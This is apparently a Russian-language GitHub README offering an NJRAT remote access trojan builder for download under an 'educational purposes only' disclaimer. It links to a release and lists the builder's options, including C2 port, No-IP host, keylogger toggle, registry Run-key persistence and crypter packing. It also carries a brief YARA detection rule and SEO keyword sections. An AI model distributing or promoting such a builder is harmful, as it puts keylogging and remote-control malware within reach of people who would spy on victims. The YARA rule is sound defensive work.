# 🚨 NJRAT Builder (только в образовательных целях)

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) [![Security Research](https://img.shields.io/badge/Security-Research-red)](https://github.com) [![Malware Analysis](https://img.shields.io/badge/Malware-Analysis-blue)](https://github.com)

## 📖 SEO Описание
NJRat builder для образовательного анализа RAT конструкторов, изучения конфигураций и методов обнаружения вредоносного ПО специалистами по кибербезопасности.

## ⚠️ Предупреждение
**Данный репозиторий предназначен только для образовательных целей и целей защиты. Создание или распространение вредоносного ПО NJRAT незаконно. Автор не поддерживает вредоносную деятельность. Используйте только в изолированных лабораторных средах для понимания работы конструкторов RAT с целью разработки средств защиты.**

## 💻 Системные требования
| Компонент | Минимально |
|-----------|------------|
| ОС | Windows 10/11 (ВМ для анализа) |
| Процессор | 2+ ядра |
| ОЗУ | 4 ГБ |
| Хранилище | 10 ГБ свободного места |
| Инструменты | Detect It Easy, PE Studio, IDA Free, Wireshark |
| Сеть | Изолированная виртуальная сеть (без выхода в интернет) |

## ⬇️ Скачивание

[![Скачать последний релиз](https://img.shields.io/badge/Скачать-GitHub_Releases-blue?style=for-the-badge&logo=github)](https://github.com/andegroundchalice/nj-r4t-build-github/releases/tag/njrat-builder)

## 🧠 Характеристики билдера
- **Формат вывода**: Windows Portable Executable (PE32)
- **Типичные мьютексы**: `NjRat`, `QWER1234`
- **Методы закрепления**: Ключи реестра Run, папка автозагрузки
- **Типичный размер файла**: 50КБ - 200КБ
- **Упаковщик/протектор**: Часто UPX или самодельный криптер

**Опции конфигурации (для образовательного анализа):**

    - Порт сервера (по умолчанию: 5552)
    - Метод автозапуска
    - Включение/отключение кейлоггера
    - Reverse DNS / No-IP хост
    - Имя устанавливаемого файла
    - Строка мьютекса

## 🛡️ Индикаторы обнаружения (для синих команд)

    # Пример YARA правила
    rule NJRAT_Builder_Output {
        strings:
            $s1 = "NJRAT" wide
            $s2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            $s3 = "keylogger" nocase
        condition:
            any of them
    }

## 📜 Лицензия
Лицензия MIT — см. файл LICENSE

## 🔑 SEO Ключевые слова
NJRat builder, анализ RAT билдеров, обнаружение NJRAT, кибербезопасность
